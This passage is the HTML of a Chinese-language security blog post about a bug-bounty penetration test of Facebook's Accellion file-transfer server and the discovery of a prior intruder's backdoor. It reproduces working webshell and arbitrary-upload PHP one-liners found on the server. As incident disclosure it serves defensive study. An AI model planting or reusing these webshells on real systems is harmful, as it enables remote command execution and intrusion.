&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone‚Äôs Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;Êª≤ÈÄè Facebook ÁöÑÊÄùË∑ØËàáÁôºÁèæ&lt;/a&gt; (‰∏≠ÊñáÁâàÊú¨)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ÂØ´Âú®ÊïÖ‰∫ã‰πãÂâç&quot;&gt;ÂØ´Âú®ÊïÖ‰∫ã‰πãÂâç&lt;/h3&gt;

&lt;p&gt;Ë∫´ÁÇ∫‰∏Ä‰ΩçÊª≤ÈÄèÊ∏¨Ë©¶‰∫∫Âì°ÔºåÊØîËµ∑ Client Side ÁöÑÂº±ÈªûÊàëÊõ¥ÂñúÊ≠° Server Side ÁöÑÊîªÊìäÔºåËÉΩÂ§†Áõ¥Êé•ÁöÑÊéßÂà∂‰º∫ÊúçÂô®„ÄÅÁç≤ÂæóÊ¨äÈôêÊìç‰Ωú SHELL ÊâçÁàΩ &amp;lt;(Ôø£Ô∏∂Ôø£)&amp;gt;&lt;/p&gt;

&lt;p&gt;Áï∂ÁÑ∂‰∏ÄÊ¨°ÂÆåÁæéÁöÑÊª≤ÈÄè‰ªª‰ΩïÂΩ¢ÂºèÁöÑÂº±ÈªûÈÉΩ‰∏çÂèØÂ∞èË¶∑ÔºåÂú®ÂØ¶ÈöõÊª≤ÈÄèÊôÇÂÅ∂ÁàæÈÇÑÊòØÈúÄË¶Å‰∫õ Client Side Âº±ÈªûÁµÑÂêàÂèØ‰ª•Êõ¥ÂÆåÁæéÁöÑÊéßÂà∂‰º∫ÊúçÂô®Ôºå‰ΩÜÊòØÂú®Â∞ãÊâæÂº±ÈªûÊôÇÊàëÊú¨Ë∫´ÈÇÑÊòØÂÖàÂÅèÂêë‰ª•ÂèØÁõ¥Êé•ÈÄ≤ÂÖ•‰º∫ÊúçÂô®ÁöÑÊñπÂºè‰æÜÂéªÂ∞ãÊâæÈ¢®Èö™È´ò„ÄÅËÉΩÈï∑È©ÖÁõ¥ÂÖ•ÁöÑÂº±Èªû„ÄÇ&lt;/p&gt;

&lt;p&gt;Èö®Ëëó Facebook Âú®‰∏ñÁïå‰∏äË∂ä‰æÜË∂äÁÅ´Á¥Ö„ÄÅÁî®Êà∂ÈáèË∂ä‰æÜË∂äÂ§öÔºå‰∏ÄÁõ¥‰ª•‰æÜÈÉΩÊúâÊÉ≥Ë¶ÅÂòóË©¶ÁúãÁúãÁöÑÊÉ≥Ê≥ïÔºåÊÅ∞Â∑ß Facebook Âú® 2012 Âπ¥ÈñãÂßãÊúâ‰∫Ü &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty&lt;/a&gt; ÁçéÈáëÁçµ‰∫∫ÁöÑÊ©üÂà∂ËÆìÊàëÊõ¥Ë∫çË∫çÊ¨≤Ë©¶„ÄÇ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;‰∏ÄËà¨Â¶ÇÁî±Êª≤ÈÄèÁöÑËßíÂ∫¶‰æÜË™™ÁøíÊÖ£ÊÄßÈÉΩÊúÉÂæûÊî∂ÈõÜË≥áÊñô„ÄÅÂÅµÊü•ÈñãÂßãÔºåÈ¶ñÂÖàÁïåÂÆöÂá∫ÁõÆÊ®ôÂú®Á∂≤Ë∑Ø‰∏äÁöÑ ‚ÄúÁØÑÂúç‚Äù ÊúâÂ§öÂ§ßÔºåÂßë‰∏îÂèØ‰ª•Ë©ï‰º∞‰∏Ä‰∏ãÂæû‰ΩïËôïÊØîËºÉÊúâÊ©üÊúÉ‰∏ãÊâã„ÄÇ‰æãÂ¶Ç:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Google Hacking Âà∞‰ªÄÈ∫ºË≥áÊñô?&lt;/li&gt;
  &lt;li&gt;Áî®‰∫ÜÂπæÂÄã B ÊÆµÁöÑ IP ? C ÊÆµÁöÑ IP ?&lt;/li&gt;
  &lt;li&gt;Whois? Reverse Whois?&lt;/li&gt;
  &lt;li&gt;Áî®‰∫Ü‰ªÄÈ∫ºÂüüÂêç? ÂÖßÈÉ®‰ΩøÁî®ÁöÑÂüüÂêç? Êé•ËëóÂÅöÂ≠êÂüüÂêçÁöÑÁåúÊ∏¨„ÄÅÊéÉÊèè&lt;/li&gt;
  &lt;li&gt;ÂÖ¨Âè∏Âπ≥Â∏∏ÊÑõÁî®‰ªÄÈ∫ºÊ®£ÊäÄË°ì„ÄÅË®≠ÂÇô?&lt;/li&gt;
  &lt;li&gt;Âú® Github, Pastebin ‰∏äÊòØÂê¶ÊúâÊ¥©Êºè‰ªÄÈ∫ºË≥áË®ä?&lt;/li&gt;
  &lt;li&gt;‚Ä¶etc&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Áï∂ÁÑ∂ Bug Bounty ‰∏¶‰∏çÊòØËÆì‰Ω†ÁÑ°ÈôêÂà∂ÁöÑÊîªÊìäÔºåÂ∞áÊâÄËíêÈõÜÂà∞ÁöÑÁØÑÂúçËàá Bug Bounty ÊâÄÂÖÅË®±ÁöÑÁØÑÂúçÂÅö‰∫§ÈõÜÂæåÊâçÊòØ‰Ω†ÁúüÊ≠£ÂèØ‰ª•ÂéªÂòóË©¶ÁöÑÁõÆÊ®ô„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏ÄËà¨‰æÜË™™Â§ßÂÖ¨Âè∏Âú®Êª≤ÈÄè‰∏≠ÊØîËºÉÂÆπÊòìÂá∫ÁèæÁöÑÂïèÈ°åÈªûÈÄôË£°ËàâÂπæÂÄã‰æãÂ≠ê‰æÜÊé¢Ë®é&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Â∞çÂ§öÊï∏Â§ßÂÖ¨Âè∏ËÄåË®ÄÔºå‚Äù&lt;strong&gt;Á∂≤Ë∑ØÈÇäÁïå&lt;/strong&gt;‚Äù ÊòØÊØîËºÉÈõ£È°ßÂèä„ÄÅÂÆπÊòìÂá∫ÁèæÂïèÈ°åÁöÑ‰∏ÄÂ°äÔºåÁï∂ÂÖ¨Âè∏Ë¶èÊ®°Ë∂äÂ§ßÔºåÂêåÊôÇÊìÅÊúâÊï∏ÂçÉ„ÄÅÊï∏Ëê¨Âè∞Ê©üÂô®Âú®Á∑öÔºåÁ∂≤ÁÆ°ÂæàÈõ£È°ßÂèäÂà∞ÊØèÂè∞Ê©üÂô®„ÄÇÂú®ÊîªÈò≤Ë£°ÔºåÈò≤ÂÆàË¶ÅÈò≤ÁöÑÊòØ‰∏ÄÂÄãÈù¢Ôºå‰ΩÜÊîªÊìäÂè™ÈúÄÊâæÂÄã‰∏ÄÂÄãÈªûÂ∞±ÂèØ‰ª•Á™ÅÁ†¥ÔºåÊâÄ‰ª•Èò≤ÂÆàÊñπÁõ∏Â∞çËôïÊñºÂº±Âã¢ÔºåÊîªÊìäËÄÖÂè™Ë¶ÅÊâæÂà∞‰∏ÄÂè∞‰ΩçÊñºÁ∂≤Ë∑ØÈÇäÁïåÁöÑÊ©üÂô®ÂÖ•‰æµÈÄ≤ÂéªÂ∞±ÂèØ‰ª•ÈñãÂßãÂú®ÂÖßÁ∂≤ÈÄ≤Ë°åÊª≤ÈÄè‰∫Ü!&lt;/li&gt;
  &lt;li&gt;Â∞çÊñº ‚Äú&lt;strong&gt;ÈÄ£Á∂≤Ë®≠ÂÇô&lt;/strong&gt;‚Äù ÁöÑÂÆâÂÖ®ÊÑèË≠òÁõ∏Â∞çËñÑÂº±ÔºåÁî±ÊñºÈÄ£Á∂≤Ë®≠ÂÇôÈÄöÂ∏∏‰∏çÊúÉÊèê‰æõ SHELL Áµ¶ÁÆ°ÁêÜÂì°ÂÅöÈÄ≤‰∏ÄÊ≠•ÁöÑÊìç‰ΩúÔºåÂè™ËÉΩÁî±Ë®≠ÂÇôÊú¨Ë∫´ÊâÄÊèê‰æõÁöÑ‰ªãÈù¢Ë®≠ÂÆöÔºåÊâÄ‰ª•ÈÄöÂ∏∏Â∞çÊñºË®≠ÂÇôÁöÑÈò≤Á¶¶ÈÉΩÊòØÂæûÁ∂≤Ë∑ØÂ±§‰æÜÊäµÊìãÔºå‰ΩÜÂ¶ÇÈÅáÂà∞Ë®≠ÂÇôÊú¨Ë∫´ÁöÑ 0-Day ÊàñËÄÖÊòØ 1-Day ÂèØËÉΩÈÄ£Ë¢´ÂÖ•‰æµ‰∫ÜÈÉΩ‰∏çËá™Ë¶∫„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰∫∫ÁöÑÂÆâÂÖ®ÔºåÈö®Ëëó ‚Äú&lt;strong&gt;Á§æÂ∑•Â∫´&lt;/strong&gt;‚Äù ÁöÑÂ¥õËµ∑ÔºåÊúâÊôÇÂèØ‰ª•ËÆì‰∏ÄÊ¨°Êª≤ÈÄèÁöÑÊµÅÁ®ãËÆäÂæóÁï∞Â∏∏Á∞°ÂñÆÔºåÂæûÂÖ¨ÈñãË≥áÊñôÊâæÂá∫ÂÖ¨Âè∏Âì°Â∑•ÂàóË°®ÔºåÂÜçÂæûÁ§æÂ∑•Â∫´ÊâæÂà∞ÂèØ‰ª•ÁôªÂÖ• VPN ÁöÑÂì°Â∑•ÂØÜÁ¢ºÂ∞±ÂèØ‰ª•ÈñãÂßãÈÄ≤Ë°åÂÖßÁ∂≤Êª≤ÈÄèÔºåÂ∞§ÂÖ∂Áï∂Á§æÂ∑•Â∫´Êï∏ÈáèË∂ä‰æÜË∂äÂ§ö ‚Äú&lt;strong&gt;ÈáèËÆäÊàêË≥™ËÆä&lt;/strong&gt;‚Äù ÊôÇÂè™Ë¶ÅÈóúÈçµ‰∫∫Áâ©ÁöÑÂØÜÁ¢ºÂú®Á§æÂ∑•Â∫´‰∏≠ÂèØÊâæÂà∞ÔºåÈÇ£‰ºÅÊ•≠ÁöÑÂÆâÂÖ®ÊÄßÂ∞±ÂÖ®ÁÑ∂Á™ÅÁ†¥ :P
&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÁêÜÊâÄÁï∂ÁÑ∂Âú®Â∞ãÊâæ Facebook Âº±ÈªûÊôÇÊúÉ‰ª•Âπ≥Â∏∏ÈÄ≤Ë°åÊª≤ÈÄèÁöÑÊÄùË∑ØÈÄ≤Ë°åÔºåÂú®ÈñãÂßãÊêúÈõÜË≥áÊñôÊôÇÈô§‰∫ÜÈáùÂ∞ç Facebook Êú¨Ë∫´ÂüüÂêçÊü•Ë©¢Â§ñ‰πüÂ∞çË®ªÂÜä‰ø°ÁÆ±ÈÄ≤Ë°å Reverse Whois ÊÑèÂ§ñÁôºÁèæ‰∫ÜÂÄãÂ•áÂ¶ôÁöÑÂüüÂêçÂêçÁ®±&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;TFBNW ‰ºº‰πéÊòØ ‚Äú&lt;strong&gt;TheFacebook Network&lt;/strong&gt;‚Äù ÁöÑÁ∏ÆÂØ´&lt;br /&gt;
ÂÜçËóâÁî±ÂÖ¨ÈñãË≥áÊñôÁôºÁèæÂ≠òÂú®‰∏ãÈù¢ÈÄôÂè∞ÈÄôÂè∞‰º∫ÊúçÂô®&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vpn.tfbnw.net
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Âìá! vpn.tfbnw.net ÁúãËµ∑‰æÜÊòØÂÄã Juniper SSL VPN ÁöÑÁôªÂÖ•‰ªãÈù¢Ôºå‰∏çÈÅéÁâàÊú¨ÊªøÊñ∞ÁöÑÊ≤íÊúâÁõ¥Êé•ÂèØÂà©Áî®ÁöÑÂº±ÈªûÔºå‰∏çÈÅéÈÄô‰πüÊàêÁÇ∫‰∫ÜÈÄ≤ÂÖ•ÂæåÈù¢ÊïÖ‰∫ãÁöÑÈñãÁ´Ø„ÄÇ&lt;/p&gt;

&lt;p&gt;TFBNW Áúã‰ººÊòØ Facebook ÂÖßÈÉ®Áî®ÁöÑÂüüÂêçÔºå‰æÜÊéÉÊéÉ vpn.tfbnw.net ÂêåÁ∂≤ÊÆµÁúãÊúÉÊúâ‰ªÄÈ∫ºÁôºÁèæ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mail Server Outlook Web App&lt;/li&gt;
  &lt;li&gt;F5 BIGIP SSL VPN&lt;/li&gt;
  &lt;li&gt;CISCO ASA SSL VPN&lt;/li&gt;
  &lt;li&gt;Oracle E-Business&lt;/li&gt;
  &lt;li&gt;MobileIron MDM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÂæûÈÄôÂπæÂè∞Ê©üÂô®Â§ßËá¥ÂèØ‰ª•Âà§Êñ∑ÈÄôÂÄãÁ∂≤ÊÆµÂ∞çÊñº Facebook ‰æÜË™™ÊáâË©≤ÊòØÁõ∏Â∞çÈáçË¶ÅÁöÑÁ∂≤ÊÆµÔºå‰πãÂæå‰∏ÄÂàáÁöÑÊïÖ‰∫ãÂ∞±ÂæûÈÄôË£°ÈñãÂßã„ÄÇ&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;Âº±ÈªûÁôºÁèæ&quot;&gt;Âº±ÈªûÁôºÁèæ&lt;/h3&gt;

&lt;p&gt;Âú®ÂêåÁ∂≤ÊÆµ‰∏≠ÔºåÁôºÁèæ‰∏ÄÂè∞ÁâπÂà•ÁöÑ‰º∫ÊúçÂô®&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;files.fb.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/1.jpg&quot; alt=&quot;files.fb.com&quot; /&gt;
&lt;em&gt;‚Üë files.fb.com ÁôªÂÖ•‰ªãÈù¢&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Âæû LOGO ‰ª•Âèä Footer Âà§Êñ∑ÊáâË©≤ÊòØ Accellion ÁöÑ Secure File Transfer (‰ª•‰∏ãÁ∞°Á®± FTA)&lt;/p&gt;

&lt;p&gt;FTA ÁÇ∫‰∏ÄÊ¨æÊ®ôÊ¶úÂÆâÂÖ®Ê™îÊ°àÂÇ≥Ëº∏ÁöÑÁî¢ÂìÅÔºåÂèØËÆì‰ΩøÁî®ËÄÖÁ∑ö‰∏äÂàÜ‰∫´„ÄÅÂêåÊ≠•Ê™îÊ°àÔºå‰∏¶Êï¥Âêà AD, LDAP, Kerberos Á≠â Single Sign-on Ê©üÂà∂ÔºåEnterprise ÁâàÊú¨Êõ¥ÊîØÊè¥ SSL VPN ÊúçÂãô„ÄÇ&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÁúãÂà∞ FTA ÁöÑÁ¨¨‰∏Ä‰ª∂‰∫ãÊòØÂéªÁ∂≤Ë∑Ø‰∏äÊêúÂ∞ãÊòØÂê¶ÊúâÂÖ¨ÈñãÁöÑ Exploit ÂèØ‰ª•Âà©Áî®ÔºåExploit ÊúÄËøëÁöÑÊòØÁî± HD Moore ÁôºÁèæ‰∏¶Áôº‰ΩàÂú® Rapid7 ÁöÑÈÄôÁØá Advisory&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857&quot;&gt;Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âº±Èªû‰∏≠ÂèØÁõ¥Êé•Âæû ‚Äú&lt;strong&gt;/tws/getStatus&lt;/strong&gt;‚Äù ‰∏≠Ê¥©ÊºèÁöÑÁâàÊú¨Ë≥áË®äÂà§Êñ∑ÊòØÂê¶ÂèØÂà©Áî®ÔºåÂú®ÁôºÁèæ files.fb.com ÊôÇÁâàÊú¨Â∑≤ÂæûÊúâÊºèÊ¥ûÁöÑ 0.18 ÂçáÁ¥öËá≥ 0.20 ‰∫ÜÔºå‰∏çÈÅéÂ∞±Âæû Advisory ‰∏≠ÊâÄÈÄèÈú≤ÁöÑÁâáÊÆµÁ®ãÂºèÁ¢ºÊÑüË¶∫ FTA ÁöÑÊí∞ÂØ´È¢®Ê†ºÂ¶ÇÊûúÂÜçÁπºÁ∫åÊåñÊéòÂèØËÉΩÈÇÑÊòØÊúÉÊúâÂïèÈ°åÂ≠òÂú®ÁöÑÔºåÊâÄ‰ª•ÈÄôÊôÇÁöÑÁ≠ñÁï•‰æøÈñãÂßãÂæÄÂ∞ãÊâæ FTA Áî¢ÂìÅÁöÑ 0-Day ÂâçÈÄ≤!&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÂæûÂØ¶ÈöõÈªëÁÆ±ÁöÑÊñπÂºèÂÖ∂ÂØ¶Êâæ‰∏çÂá∫‰ªÄÈ∫ºÂïèÈ°åÈªûÂè™Â•ΩÊÉ≥Ëæ¶Ê≥ïÂ∞áÊñπÂêëËΩâÁÇ∫ÁôΩÁÆ±Ê∏¨Ë©¶ÔºåÈÄèÈÅéÂêÑÁ®ÆÊñπÂºèÊãøÂà∞ËàäÁâàÁöÑ FTA ÂéüÂßãÁ¢ºÂæåÁµÇÊñºÂèØ‰ª•ÈñãÂßãÁ†îÁ©∂‰∫Ü!&lt;/p&gt;

&lt;p&gt;Êï¥ÂÄã FTA Áî¢ÂìÅÂ§ßËá¥Êû∂Êßã&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Á∂≤È†ÅÁ´Ø‰ªãÈù¢‰∏ªË¶ÅÁî± Perl ‰ª•Âèä PHP ÊßãÊàê&lt;/li&gt;
  &lt;li&gt;PHP ÂéüÂßãÁ¢ºÁöÜÁ∂ìÈÅé IonCube Âä†ÂØÜ&lt;/li&gt;
  &lt;li&gt;Âú®ËÉåÊôØË∑ë‰∫ÜË®±Â§ö Perl ÁöÑ Daemon&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;È¶ñÂÖàÊòØËß£ÂØÜ IonCude ÁöÑÈÉ®ÂàÜÔºåË®±Â§öË®≠ÂÇôÁÇ∫‰∫ÜÈò≤Ê≠¢Ëá™Â∑±ÁöÑÁî¢ÂìÅË¢´Ê™¢Ë¶ñÊâÄ‰ª•ÊúÉÂ∞áÂéüÂßãÁ¢ºÂä†ÂØÜÔºå‰∏çÈÅéÂ•ΩÂú® FTA ‰∏äÁöÑ IonCude ÁâàÊú¨Ê≤íÂà∞ÊúÄÊñ∞ÔºåÂèØ‰ª•‰ΩøÁî®ÁèæÊàêÁöÑÂ∑•ÂÖ∑Ëß£ÂØÜÔºå‰∏çÈÅéÁî±Êñº PHP ÁâàÊú¨ÁöÑÂïèÈ°åÔºåÁ¥∞ÁØÄÈÉ®‰ªΩ‰ª•ÂèäÊï∏ÂÄºÈÅãÁÆóÁ≠âÂèØËÉΩË¶ÅÈù†Ëá™Â∑±‰øÆÂæ©‰∏Ä‰∏ãÔºå‰∏çÁÑ∂ÊúâÈªûÈõ£Áúã‚Ä¶&lt;/p&gt;

&lt;p&gt;Á∂ìÈÅéÁ∞°ÂñÆÁöÑÂéüÂßãÁ¢ºÂØ©Êü•ÂæåÁôºÁèæÔºåÂ•ΩÊâæÁöÑÂº±ÈªûÊáâË©≤ÈÉΩË¢´ Rapid7 ÊâæËµ∞‰∫Ü T^T&lt;br /&gt;
ËÄåÈúÄË¶ÅË™çË≠âÊâçËÉΩËß∏ÁôºÁöÑÊºèÊ¥ûÂèà‰∏çÊÄéÈ∫ºÂ•ΩÁî®ÔºåÂè™Â•ΩË™çÁúüÈªûÂæÄÊ∑±Â±§‰∏ÄÈªûÁöÑÂú∞ÊñπÊåñÊéò!&lt;/p&gt;

&lt;p&gt;Á∂ìÈÅéÂπæÂ§©ÁöÑË™çÁúüÊåñÊéòÔºåÊúÄÂæåÁ∏ΩÂÖ±ÁôºÁèæ‰∫Ü‰∏ÉÂÄãÂº±ÈªûÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∫Ü&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Cross-Site Scripting x 3&lt;/li&gt;
  &lt;li&gt;Pre-Auth SQL Injection leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Known-Secret-Key leads to Remote Code Execution&lt;/li&gt;
  &lt;li&gt;Local Privilege Escalation x 2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Èô§‰∫ÜÂõûÂ†± Facebook ÂÆâÂÖ®ÂúòÈöäÂ§ñÔºåÂÖ∂È§òÁöÑÂº±Èªû‰πüË£Ω‰ΩúÊàê Advisory Êèê‰∫§ Accellion ÊäÄË°ìÁ™óÂè£ÔºåÁ∂ìÈÅéÂª†ÂïÜ‰øÆË£úÊèê‰∫§ CERT/CC ÂæåÂèñÂæóÂõõÂÄã CVE Á∑®Ëôü&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2016-2350&lt;/li&gt;
  &lt;li&gt;CVE-2016-2351&lt;/li&gt;
  &lt;li&gt;CVE-2016-2352&lt;/li&gt;
  &lt;li&gt;CVE-2016-2353&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ë©≥Á¥∞ÁöÑÂº±ÈªûÁ¥∞ÁØÄÊúÉÂæÖ Full Disclosure Policy ÂæåÂÖ¨Â∏É!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/2.jpg&quot; alt=&quot;shell on facebook&quot; /&gt;
&lt;em&gt;‚Üë ‰ΩøÁî® Pre-Auth SQL Injection ÂØ´ÂÖ• Webshell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Âú®ÂØ¶ÈöõÊª≤ÈÄè‰∏≠ÈÄ≤Âéª‰º∫ÊúçÂô®ÂæåÁöÑÁ¨¨‰∏Ä‰ª∂‰∫ãÊÉÖÂ∞±ÊòØÊ™¢Ë¶ñÁï∂ÂâçÁöÑÁí∞Â¢ÉÊòØÂê¶Â∞çËá™Â∑±ÂèãÂñÑÔºåÁÇ∫‰∫ÜË¶ÅËÆìËá™Â∑±ÂèØ‰ª•Âú®‰º∫ÊúçÂô®‰∏äÂæÖÁöÑ‰πÖÂ∞±Ë¶ÅÁõ°ÂèØËÉΩÁöÑ‰∫ÜËß£‰º∫ÊúçÂô®‰∏äÊúâ‰ΩïÈôêÂà∂„ÄÅÁ¥ÄÈåÑÔºåÈÅøÈñãÂèØËÉΩÊúÉË¢´ÁôºÁèæÁöÑÈ¢®Èö™ :P&lt;/p&gt;

&lt;p&gt;Facebook Â§ßËá¥Êúâ‰ª•‰∏ãÈôêÂà∂:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Èò≤ÁÅ´ÁâÜÁÑ°Ê≥ïÈÄ£Â§ñ, TCP, UDP, 53, 80, 443 ÁöÜÁÑ°Ê≥ï&lt;/li&gt;
  &lt;li&gt;Â≠òÂú®ÈÅ†Á´ØÁöÑ Syslog ‰º∫ÊúçÂô®&lt;/li&gt;
  &lt;li&gt;ÈñãÂïü Auditd Ë®òÈåÑ&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÁÑ°Ê≥ïÂ§ñÈÄ£ÁúãËµ∑‰æÜÊúâÈªûÈ∫ªÁÖ©Ôºå‰ΩÜÊòØ ICMP Tunnel Áúã‰ººÊòØÂèØË°åÁöÑÔºå‰ΩÜÈÄôÂè™ÊòØ‰∏ÄÂÄã Bug Bounty Program ÂÖ∂ÂØ¶‰∏çÈúÄË¶ÅÂ§™È∫ªÁÖ©Â∞±Á¥îÁ≤π‰ª• Webshell Êìç‰ΩúÂç≥ÂèØ„ÄÇ&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;‰ºº‰πéÊúâÈªûÂ•áÊÄ™&quot;&gt;‰ºº‰πéÊúâÈªûÂ•áÊÄ™?&lt;/h3&gt;

&lt;p&gt;Ê≠£Áï∂Êî∂ÈõÜË≠âÊìöÊ∫ñÂÇôÂõûÂ†± Facebook ÂÆâÂÖ®ÂúòÈöäÊôÇÔºåÂæûÁ∂≤È†ÅÊó•Ë™å‰∏≠‰ºº‰πéÁúãÂà∞‰∏Ä‰∫õÂ•áÊÄ™ÁöÑÁóïË∑°„ÄÇ&lt;/p&gt;

&lt;p&gt;È¶ñÂÖàÊòØÂú® ‚Äú&lt;strong&gt;/var/opt/apache/php_error_log&lt;/strong&gt;‚Äù ‰∏≠ÁúãÂà∞‰∏Ä‰∫õÂ•áÊÄ™ÁöÑ PHP ÈåØË™§Ë®äÊÅØÔºåÂæûÈåØË™§Ë®äÊÅØ‰æÜÁúã‰ºº‰πéÂÉèÊòØÈÇäÊîπ Code ÈÇäÂü∑Ë°åÊâÄÁî¢ÁîüÁöÑÈåØË™§?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/3.jpg&quot; alt=&quot;PHP error log&quot; /&gt;
&lt;em&gt;‚Üë PHP error log&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Ë∑üÈö®ÈåØË™§Ë®äÊÅØÁöÑË∑ØÂæëÂéªÁúãÁôºÁèæÁñë‰ººÂâç‰∫∫Áïô‰∏ãÁöÑ Webshell ÂæåÈñÄ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/4.jpg&quot; alt=&quot;Webshell on facebook server&quot; /&gt;
&lt;em&gt;‚Üë Webshell on facebook server&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂÖ∂‰∏≠ÂπæÂÄãÊ™îÊ°àÁöÑÂÖßÂÆπÂ¶Ç‰∏ã&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;sshpass&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ê≤íÈåØÔºåÂ∞±ÊòØÈÇ£ÂÄã &lt;a href=&quot;http://linux.die.net/man/1/sshpass&quot;&gt;sshpass&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;div class=&quot;highlight-name&quot;&gt;bN3d10Aw.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;c&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;uploader.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;f][&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp_name&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;], basename(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES[&quot;f&quot;][&quot;name&quot;]&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)); ?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;d.php&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;include_oncce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/remote.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span 